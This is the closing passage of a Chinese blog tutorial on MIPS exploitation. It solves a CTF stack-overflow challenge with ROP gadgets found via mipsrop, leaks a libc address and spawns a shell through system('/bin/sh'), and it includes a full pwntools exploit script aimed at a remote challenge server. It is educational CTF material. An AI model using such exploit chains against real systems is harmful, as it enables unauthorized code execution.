+<p><img src="/blog_img/image-20200520104113668.png" alt="image-20200520104113668"></p>
+<p>可以看到这里是参数在栈中的相应偏移的构造，所以我们跳转到这里，并在相应偏移处构造好参数值，也就是说可以把想要调用的函数放到$ra，然后参数放到s0-s3的寄存器中，但是a0-a3才是我们的参数寄存器，所以要继续找gadget：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.find(<span class="string">"move $a0"</span>)</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x00400750</span>  |  move $a0,$s1                                        |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x004007A8</span>  |  move $a0,$s1                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x004007EC</span>  |  move $a0,$zero                                      |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x00400860</span>  |  move $a0,$v0                                        |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x00400884</span>  |  move $a0,$v0                                        |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x004008A8</span>  |  move $a0,$v0                                        |  jalr  $v0                             |</span><br><span class="line">|  <span class="number">0x00400904</span>  |  move $a0,$zero                                      |  jalr  $v0                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>这里0x4007a8的gadget可以实现传参数到$a0,同时$s2会被调用，正合我们心意</p>
+<p><img src="/blog_img/image-20200520104637111.png" alt="image-20200520104637111"></p>
+<p>那么printf函数这么调用呢？</p>
+<p><img src="/blog_img/image-20200520104929967.png" alt="image-20200520104929967"></p>
+<p>这里可以看到调用完printf后继续执行vuln会再次栈溢出，这时就可以实现再次栈溢出了</p>
+<p>所以我们就可以构造出合理的payload来泄漏地址了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">j2s2_s1a0=<span class="number">0x004007A8</span><span class="comment">#gadget</span></span><br><span class="line">li_ras3s2s1s0=<span class="number">0x004006C8</span></span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">printf_plt = <span class="number">0x40092c</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">py += <span class="string">'bbbb'</span></span><br><span class="line">py += p32(li_ras3s2s1s0)</span><br><span class="line">py += <span class="string">'c'</span>*<span class="number">0x1c</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s0</span></span><br><span class="line">py += p32(read_got)<span class="comment">#s1-&gt;a0</span></span><br><span class="line">py += p32(printf_plt)<span class="comment">#s2-&gt;t9</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s3</span></span><br><span class="line">py += p32(j2s2_s1a0)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure>
+
+<p>这一步会打印出我们的read函数的真实地址出来，然后再次栈溢出，布局已经知道了，我们只要写入system(/bin/sh)即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">py += <span class="string">'bbbb'</span></span><br><span class="line">py += p32(li_ras3s2s1s0)</span><br><span class="line">py += <span class="string">'c'</span>*<span class="number">0x1c</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s0</span></span><br><span class="line">py += p32(binsh)<span class="comment">#s1-&gt;a0</span></span><br><span class="line">py += p32(system)<span class="comment">#s2-&gt;t9</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s3</span></span><br><span class="line">py += p32(j2s2_s1a0)<span class="comment">#ra</span></span><br></pre></td></tr></table></figure>
+
+<p>最后是完整的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_elf = <span class="string">'./pwn2.dms'</span></span><br><span class="line">context.binary = bin_elf</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mipsel"</span>, <span class="string">"-L"</span>, <span class="string">"/home/v1ct0r/buildroot/output/target"</span>, bin_elf])</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-mipsel"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"/home/v1ct0r/buildroot/output/target"</span>, bin_elf])</span><br><span class="line"></span><br><span class="line">elf = ELF(bin_elf)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.0"</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"What's your name: \n"</span>)</span><br><span class="line">sl(<span class="string">"king"</span>)</span><br><span class="line"></span><br><span class="line">j2s2_s1a0=<span class="number">0x004007A8</span><span class="comment">#gadget</span></span><br><span class="line">li_ras3s2s1s0=<span class="number">0x004006C8</span></span><br><span class="line">read_got = elf.got[<span class="string">"read"</span>]</span><br><span class="line">printf_plt = <span class="number">0x40092c</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">py += <span class="string">'bbbb'</span></span><br><span class="line">py += p32(li_ras3s2s1s0)</span><br><span class="line">py += <span class="string">'c'</span>*<span class="number">0x1c</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s0</span></span><br><span class="line">py += p32(read_got)<span class="comment">#s1-&gt;a0</span></span><br><span class="line">py += p32(printf_plt)<span class="comment">#s2-&gt;t9</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s3</span></span><br><span class="line">py += p32(j2s2_s1a0)<span class="comment">#ra</span></span><br><span class="line">sl(py)</span><br><span class="line">ru(<span class="string">"king"</span>)</span><br><span class="line">rc(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#libcbase</span></span><br><span class="line">read_addr = u32(rc(<span class="number">4</span>))</span><br><span class="line">libc_base = read_addr-libc.sym[<span class="string">"read"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_addr--&gt;"</span> + hex(libc_base)</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">py = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">py += <span class="string">'bbbb'</span></span><br><span class="line">py += p32(li_ras3s2s1s0)</span><br><span class="line">py += <span class="string">'c'</span>*<span class="number">0x1c</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s0</span></span><br><span class="line">py += p32(binsh)<span class="comment">#s1-&gt;a0</span></span><br><span class="line">py += p32(system)<span class="comment">#s2-&gt;t9</span></span><br><span class="line">py += p32(<span class="number">0</span>)<span class="comment">#s3</span></span><br><span class="line">py += p32(j2s2_s1a0)<span class="comment">#ra</span></span><br><span class="line">sl(py)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/image-20200520105247466.png" alt="image-20200520105247466"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、mips的编译环境安装"><span class="toc-number">1.</span> <span class="toc-text">一、mips的编译环境安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、动态调试环境安装"><span class="toc-number">2.</span> <span class="toc-text">二、动态调试环境安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、mips程序的运行、反编译和调试方法"><span class="toc-number">3.</span> <span class="toc-text">三、mips程序的运行、反编译和调试方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、mips的汇编和常用的知识点总结"><span class="toc-number">4.</span> <span class="toc-text">四、mips的汇编和常用的知识点总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五、ctf中的题目复现"><span class="toc-number">5.</span> <span class="toc-text">五、ctf中的题目复现</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
